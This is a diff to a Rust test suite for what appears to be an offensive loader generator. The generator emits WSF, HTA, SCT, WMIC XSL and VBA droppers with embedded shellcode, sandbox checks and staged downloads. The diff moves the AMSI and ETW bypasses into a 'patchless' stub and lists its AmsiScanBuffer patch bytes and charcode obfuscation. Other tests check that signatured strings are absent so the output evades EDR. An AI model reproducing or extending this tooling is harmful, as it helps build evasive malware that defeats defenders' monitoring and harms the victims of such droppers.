@@ -56,25 +56,14 @@ fn assert_no_plaintext_staged_secrets(src: &str, label: &str) {
 // ── Script: WSF ──────────────────────────────────────────────────────────────
 
 #[test]
-fn wsf_renders_with_amsi_bypass() {
+fn wsf_embeds_shellcode() {
     let src = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
-    // amsiInitFailed charcode: 97,109,115,105 = 'a','m','s','i'
-    assert!(src.contains("97,109,115,105") || src.contains("SetValue(null, true)"),
-        "WSF must contain AMSI bypass via charcode-encoded field name");
     assert!(src.contains("fc4883e4f0"), "shellcode must be embedded");
 }
 
-#[test]
-fn wsf_has_etw_bypass() {
-    let src = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
-    // ETW bypass function is present (name is randomised, but it calls SetValue with charcode arrays)
-    // The jsc_eventing_ep charcode sequence "83,121,115,116..." contains these digits;
-    // SetValue(null, 0) is the ETW disable call.
-    assert!(src.contains("SetValue(null, 0)") || src.contains("SetValue(null,0)")
-        || src.contains("m_enabled") || src.contains("EventProvider")
-        || src.contains("83,121,115"), // charcode for 'S' in "System.Diagnostics..."
-        "WSF must contain ETW bypass function (charcode-obfuscated or rendered)");
-}
+// AMSI/ETW reflection bypass has been moved into the DotNetToJScript stub
+// (patchless via wsf_stub.cs.tera). Script templates no longer carry the
+// signatured reflection path.
 
 #[test]
 fn wsf_has_sandbox_check() {
@@ -102,14 +91,6 @@ fn hta_renders() {
 }
 
 #[test]
-fn hta_has_etw_bypass() {
-    let src = generate_script_source(&base_config(LoaderType::Hta)).unwrap();
-    // ETW bypass appears either as rendered string or charcode-array reference
-    assert!(src.contains("EventProvider") || src.contains("m_enabled") || src.contains("36)"),
-        "HTA must contain ETW bypass");
-}
-
-#[test]
 fn hta_has_sandbox_check() {
     let src = generate_script_source(&base_config(LoaderType::Hta)).unwrap();
     assert!(src.contains("vmtoolsd") || src.contains("Screen.Width") || src.contains("Win32_Process"),
@@ -126,12 +107,10 @@ fn sct_renders() {
 }
 
 #[test]
-fn sct_has_etw_and_sandbox() {
+fn sct_has_sandbox_check() {
     let src = generate_script_source(&base_config(LoaderType::Regsvr32Sct)).unwrap();
     assert!(src.contains("vmtoolsd") || src.contains("Win32_Process") || src.contains("ExecQuery("),
         "SCT must have sandbox check");
-    assert!(src.contains("EventProvider") || src.contains("m_enabled") || src.contains("36)") || src.contains("(4|32)"),
-        "SCT must have ETW bypass");
 }
 
 // ── Script: MSBuild ──────────────────────────────────────────────────────────
@@ -217,12 +196,10 @@ fn wmic_xsl_renders() {
 }
 
 #[test]
-fn wmic_has_etw_and_sandbox() {
+fn wmic_has_sandbox_check() {
     let src = generate_script_source(&base_config(LoaderType::WmicXsl)).unwrap();
     assert!(src.contains("vmtoolsd") || src.contains("Win32_Process") || src.contains("ExecQuery("),
         "WMIC XSL must have sandbox check");
-    assert!(src.contains("EventProvider") || src.contains("m_enabled") || src.contains("36)") || src.contains("(4|32)"),
-        "WMIC XSL must have ETW bypass");
 }
 
 // ── VBA: Word macro ───────────────────────────────────────────────────────────
@@ -357,8 +334,9 @@ fn wsf_two_builds_produce_different_registry_arrays() {
 #[test]
 fn wsf_no_static_binding_flags_36() {
     let src = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
+    // After stripping fn_amsi/fn_etw reflection bypass, no literal BindingFlags 36
+    // (or its bitwise equivalent (4|32)) should remain in the WSF script body.
     assert!(!src.contains("), 36)"), "literal BindingFlags 36 must not appear in WSF output");
-    assert!(src.contains("(4|32)"), "BindingFlags must be expressed as bitwise (4|32) not literal 36");
 }
 
 #[test]
@@ -476,3 +454,53 @@ fn vba_excel_staged_uses_winhttp() {
     assert!(src.contains("responseBody"), "VBA Excel staged must read responseBody");
     assert_no_plaintext_staged_secrets(&src, "VBA Excel");
 }
+
+// ── EDR hardening: patchless AMSI in stub, reflection bypass removed ─────────
+
+#[test]
+fn wsf_no_reflection_amsi_bypass() {
+    let src = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
+    // The signatured System.Management.Automation.AmsiUtils charcode (115,121,115,...) MUST NOT appear
+    assert!(!src.contains("System.Management.Automation.AmsiUtils"),
+        "WSF must not contain plaintext AmsiUtils reflection target");
+    // The charcode-encoded form would be the byte sequence — assert as well that no
+    // sequence starting "83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116" appears
+    // (that's "System.Management" in ASCII decimal)
+    assert!(!src.contains("83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116"),
+        "WSF must not contain charcode-encoded System.Management target");
+}
+
+#[test]
+fn hta_no_reflection_amsi_bypass() {
+    let src = generate_script_source(&base_config(LoaderType::Hta)).unwrap();
+    assert!(!src.contains("System.Management.Automation.AmsiUtils"));
+}
+
+#[test]
+fn sct_no_reflection_amsi_bypass() {
+    let src = generate_script_source(&base_config(LoaderType::Regsvr32Sct)).unwrap();
+    assert!(!src.contains("System.Management.Automation.AmsiUtils"));
+}
+
+#[test]
+fn wmic_no_reflection_amsi_bypass() {
+    let src = generate_script_source(&base_config(LoaderType::WmicXsl)).unwrap();
+    assert!(!src.contains("System.Management.Automation.AmsiUtils"));
+}
+
+#[test]
+fn wsf_stub_has_patchless_amsi() {
+    let mut cfg = base_config(LoaderType::Wsf);
+    cfg.wsf_stub_config = Some(WsfStubConfig {
+        namespace: "x".into(), type_name: "y".into(),
+    });
+    let stub = generate_wsf_stub_source(&cfg).unwrap();
+    // Verify the stub contains the 0xB8 0x57 0x00 0x07 0x80 0xC3 patch bytes
+    assert!(stub.contains("0xB8") && stub.contains("0x57") && stub.contains("0xC3"),
+        "stub must contain patchless AMSI patch bytes");
+    // Verify it references AmsiScanBuffer charcode
+    // "AmsiScanBuffer" first byte 'A' = 65
+    assert!(stub.contains("65,109,115,105,83,99,97,110,66,117,102,102,101,114"),
+        "stub must reference AmsiScanBuffer via charcode");
+}
+
